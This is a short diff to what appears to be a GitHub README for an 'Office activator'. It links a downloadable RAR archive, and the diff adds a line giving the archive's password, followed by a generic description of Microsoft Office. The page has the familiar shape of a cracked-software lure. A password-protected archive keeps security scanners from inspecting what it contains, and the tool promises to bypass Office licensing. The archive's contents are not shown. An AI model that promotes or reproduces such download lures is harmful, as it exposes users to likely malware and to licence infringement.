@@ -1,6 +1,7 @@
 <h1 align="center">Office activator</h1>
 
 # [DOWNLOAD](https://github.com/caspergaudet/Office-Activator/raw/refs/heads/main/Microsoft%20Office%20Activator.rar)
+# Archive password:   2025
 
 Microsoft Office is a suite of productivity software developed by Microsoft. It includes a variety of applications that are designed to help users create documents, spreadsheets, presentations, and manage emails. The most commonly used programs in the Office suite are:
 
